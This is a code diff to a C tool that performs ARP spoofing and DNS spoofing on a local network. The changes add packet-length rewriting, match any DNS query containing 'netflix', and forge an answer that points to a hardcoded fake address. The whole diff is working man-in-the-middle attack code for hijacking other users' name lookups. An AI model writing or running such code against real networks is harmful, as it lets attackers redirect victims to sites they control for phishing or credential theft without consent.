@@ -3,12 +3,10 @@
 
 #include "spoof.h"
 
-#define KEYWORD_SIZE 2
-
+extern send_params infect_params;
+static char* keyword = "netflix";
 u_long fake_web = 1111; // TODO 
 
-extern send_params infect_params;
-static char* keywords[] = {"www.netflix.com", "netflix.com"};
 
 DWORD WINAPI start_arp_spoofing(LPVOID lparam)
 {
@@ -47,6 +45,27 @@ DWORD WINAPI start_arp_spoofing(LPVOID lparam)
 }
 
 /*
+* @purpose: change the sizes of the network/transport layers in order to match
+* the fake DNS respones.
+* @params:  packet - the packet to be changed.
+*			end_packet - point to the end of the packet
+* @return:	void.
+* 
+*/
+static void change_packet_sizes(u_char* packet, void* const end_packet)
+{
+	/* locals */
+	ip_hdr* ip_header;
+	udp_hdr* udp_header;
+
+	ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
+	udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));
+
+	ip_header->length = htons((BYTE*)end_packet - (BYTE*)ip_header);
+	udp_header->len = htons((BYTE*)end_packet - (BYTE*)udp_header);
+}
+
+/*
 * @purpose: changes the answer section of the DNS packet.
 * @params:	pDnsSection - pointer to the start of the DNS section (base).
 *			pAnswerSection - pointer to the answer section.
@@ -62,14 +81,7 @@ void* create_fake_dns_respones(
 {
 	/* locals */
 	dns_hdr* dns_header = (dns_hdr*)pDnsSection;
-	struct dns_answer {
-		uint16_t name;
-		uint16_t type;
-		uint16_t cls;
-		uint32_t ttl;
-		uint16_t len;
-		uint32_t addr;
-	} answer = *(struct dns_answer*)pAnswerSection;
+	dns_answer answer = *(dns_answer*)pAnswerSection;
 
 	/* make dns constant header match the fake packet */
 	dns_header->answers = htons(1); // one answer (fake)
@@ -77,14 +89,14 @@ void* create_fake_dns_respones(
 	dns_header->additional = 0;
 	
 	/* build the fake answer */
-	answer.name = htons(((BYTE*)pQuestion - pDnsSection));
+	answer.name = htons((BYTE*)pQuestion - (BYTE*)pDnsSection);
 	answer.name |= 0xc0; //(b: 1100-0000) 
 	answer.type = htons(1); // addr
 	answer.len = htons(4); //ipv4 addr in bytes
 	answer.addr = htonl(fake_web);
 
-	*(struct dns_answer*)pAnswerSection = answer;
-	return (BYTE*)pAnswerSection + sizeof(struct dns_answer);
+	*((dns_answer*)pAnswerSection) = answer;
+	return (BYTE*)pAnswerSection + sizeof(dns_answer);
 }
 
 /*
@@ -118,19 +130,21 @@ size_t dns_spoofing(u_char* packet, size_t packet_size)
 	{
 		/* checking for match */
 		if (!matching_found)
-			for (size_t key = 0; key < KEYWORD_SIZE; key++) 
-				if (!strcmp(keywords[key], dns_data))
-				{
-					/* keywords match */
-					temp_p = (void*)dns_data;
-					matching_found = 1;
-					break;
-				}
+			if (strstr(dns_data, keyword))
+			{
+				/* keywords match */
+				temp_p = (void*)dns_data;
+				matching_found = 1;
+			}
 		dns_data += strlen(dns_data) + 5; // point to the next question
 	}
 
 	if (matching_found)
-		temp_p = create_fake_dns_respones(packet, dns_data, temp_p);
+		temp_p = create_fake_dns_respones(dns_header, dns_data, temp_p);
+	
+	/* change udp/ip header length fields */
+	change_packet_sizes(packet, temp_p);
+
 	
 	return (BYTE*)temp_p - packet;
 }
